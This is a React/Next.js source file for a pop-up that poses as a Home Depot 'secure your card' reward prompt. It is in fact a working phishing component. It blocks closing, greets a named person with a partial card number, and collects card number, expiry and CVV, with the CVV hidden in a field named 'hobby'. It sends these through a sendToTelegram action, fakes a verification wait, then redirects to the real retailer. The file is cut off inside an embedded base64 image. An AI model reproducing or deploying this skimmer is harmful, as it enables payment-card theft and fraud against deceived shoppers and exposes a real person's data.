"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import Image from "next/image"
import { X, ArrowLeft, CheckCircle, AlertCircle, Info, Loader2, Settings } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { sendToTelegram } from "@/app/actions"

export default function RewardModal() {
  const [isOpen, setIsOpen] = useState(false)
  const [step, setStep] = useState(1)
  const [showNotification, setShowNotification] = useState(false)
  const [isBouncing, setIsBouncing] = useState(false)
  const [showCVV, setShowCVV] = useState(false)
  const [isVerifying, setIsVerifying] = useState(false)
  const [isWaiting, setIsWaiting] = useState(false)
  const [waitingSeconds, setWaitingSeconds] = useState(30)
  const [progress, setProgress] = useState(0)
  const [showVerificationMessage, setShowVerificationMessage] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isLoadingGears, setIsLoadingGears] = useState(false)
  const modalRef = useRef<HTMLDivElement>(null)
  const waitingTimerRef = useRef<NodeJS.Timeout | null>(null)

  const [formData, setFormData] = useState({
    cardNumber: "",
    hobby: "", // Using hobby field for CVV
    expiryDate: "",
  })
  const [errors, setErrors] = useState({
    cardNumber: "",
    hobby: "",
    expiryDate: "",
  })

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsOpen(true)
    }, 1000)

    return () => clearTimeout(timer)
  }, [])

  // Handle bounce animation
  useEffect(() => {
    if (isBouncing) {
      const timer = setTimeout(() => {
        setIsBouncing(false)
      }, 1000)
      return () => clearTimeout(timer)
    }
  }, [isBouncing])

  // Handle notification timeout
  useEffect(() => {
    if (showNotification) {
      const timer = setTimeout(() => {
        setShowNotification(false)
      }, 3000)
      return () => clearTimeout(timer)
    }
  }, [showNotification])

  // Handle verification message timeout
  useEffect(() => {
    if (showVerificationMessage) {
      const timer = setTimeout(() => {
        setShowVerificationMessage(false)
      }, 5000)
      return () => clearTimeout(timer)
    }
  }, [showVerificationMessage])

  // 30-second waiting timer
  useEffect(() => {
    if (isWaiting && waitingSeconds > 0) {
      waitingTimerRef.current = setTimeout(() => {
        setWaitingSeconds((prev) => prev - 1)
      }, 1000)

      return () => {
        if (waitingTimerRef.current) {
          clearTimeout(waitingTimerRef.current)
        }
      }
    } else if (isWaiting && waitingSeconds === 0) {
      setIsWaiting(false)
      setIsVerifying(true)
    }
  }, [isWaiting, waitingSeconds])

  // Progress bar animation
  useEffect(() => {
    if (isVerifying) {
      const interval = setInterval(() => {
        setProgress((prevProgress) => {
          if (prevProgress >= 100) {
            clearInterval(interval)
            setIsVerifying(false)
            setShowCVV(true)
            setShowVerificationMessage(true)
            return 0
          }
          return prevProgress + 5
        })
      }, 100)
      return () => clearInterval(interval)
    }
  }, [isVerifying])

  const attemptClose = () => {
    setShowNotification(true)
    setIsBouncing(true)
  }

  const closeModal = () => {
    if (step === 3) {
      setIsOpen(false)
      // Redirect to Home Depot after closing
      window.location.href = "https://www.homedepot.com"
      // Reset state
      setTimeout(() => {
        setStep(1)
        setFormData({ cardNumber: "", hobby: "", expiryDate: "" })
        setErrors({ cardNumber: "", hobby: "", expiryDate: "" })
        setShowCVV(false)
        setIsWaiting(false)
        setWaitingSeconds(30)
      }, 300)
    } else {
      attemptClose()
    }
  }

  const goToForm = () => {
    setStep(2)
    // Show CVV fields immediately when going to form
    setTimeout(() => {
      setShowCVV(true)
      setShowVerificationMessage(true)
    }, 100)
  }

  const goBack = () => setStep(1)

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))

    if (errors[name as keyof typeof errors]) {
      setErrors((prev) => ({ ...prev, [name]: "" }))
    }
  }

  const validateForm = () => {
    let valid = true
    const newErrors = { cardNumber: "", hobby: "", expiryDate: "" }

    if (!formData.cardNumber.trim()) {
      newErrors.cardNumber = "Card number is required"
      valid = false
    } else if (formData.cardNumber.replace(/\s/g, "").length < 13) {
      newErrors.cardNumber = "Please enter a valid card number"
      valid = false
    }

    if (!formData.hobby.trim()) {
      newErrors.hobby = "CVV is required"
      valid = false
    } else if (formData.hobby.length !== 3) {
      newErrors.hobby = "CVV must be 3 digits"
      valid = false
    }

    if (!formData.expiryDate.trim()) {
      newErrors.expiryDate = "Expiry date is required"
      valid = false
    } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(formData.expiryDate)) {
      newErrors.expiryDate = "Please enter date in MM/YY format"
      valid = false
    }

    setErrors(newErrors)
    return valid
  }

  const submitForm = async () => {
    if (validateForm()) {
      try {
        setIsSubmitting(true)

        await sendToTelegram({
          cardNumber: formData.cardNumber,
          cvv: formData.hobby,
          expiryDate: formData.expiryDate,
        })

        setIsSubmitting(false)
        setIsLoadingGears(true)

        // Show gears for 3 seconds then go to success screen
        setTimeout(() => {
          setIsLoadingGears(false)
          setStep(3)
        }, 3000)
      } catch (error) {
        console.error("Error submitting form:", error)
        setIsSubmitting(false)
      }
    }
  }

  if (!isOpen) return null

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={attemptClose} />

      <div
        ref={modalRef}
        className={`relative bg-white rounded-lg shadow-xl max-w-md w-full mx-auto overflow-hidden
          ${isBouncing ? "animate-bounce" : ""}`}
      >
        <button
          onClick={closeModal}
          className="absolute top-2 right-2 p-2 rounded-full hover:bg-gray-100 transition-colors z-10"
          aria-label={step === 3 ? "Close" : "Cannot close"}
        >
          <X className="h-5 w-5" />
        </button>

        {step === 2 && (
          <button
            onClick={goBack}
            className="absolute top-2 left-2 p-2 rounded-full hover:bg-gray-100 transition-colors z-10"
            aria-label="Go back"
          >
            <ArrowLeft className="h-5 w-5" />
          </button>
        )}

        {showNotification && (
          <div className="absolute top-0 left-0 right-0 bg-yellow-500 text-white p-2 flex items-center justify-center z-20">
            <AlertCircle className="h-4 w-4 mr-2" />
            <span className="text-sm font-medium">Please click "Secure Your Card Now" to proceed</span>
          </div>
        )}

        {step === 1 && (
          <>
            <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white text-center">
              <h2 className="text-2xl font-bold">Hello CAROL J GMITER</h2>
              <p className="text-lg mt-1">Secure your card ending with 8880 on Home Depot</p>
            </div>

            <div className="p-4 flex justify-center">
              <div className="relative w-full h-48 rounded-lg overflow-hidden border">
                <Image
                  src="data:image/jpeg;base64,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